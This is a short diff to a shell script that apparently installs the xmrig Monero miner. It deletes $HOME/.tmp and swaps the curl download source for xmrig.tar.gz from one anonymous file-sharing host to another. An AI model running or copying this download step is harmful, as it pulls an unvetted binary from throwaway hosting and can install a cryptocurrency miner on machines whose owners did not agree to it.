@@ -218,8 +218,8 @@ echo "[*] Removing $HOME/.tmp directory"
 rm -rf $HOME/.tmp/
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://srv-store1.gofile.io/download/Gqql6y/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://srv-store1.gofile.io/download/Gqql6y/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://filebin.net/mr9oqo3oxe8vhq6l/xmrig.tar.gz?t=ioviough" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://filebin.net/mr9oqo3oxe8vhq6l/xmrig.tar.gz?t=ioviough file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
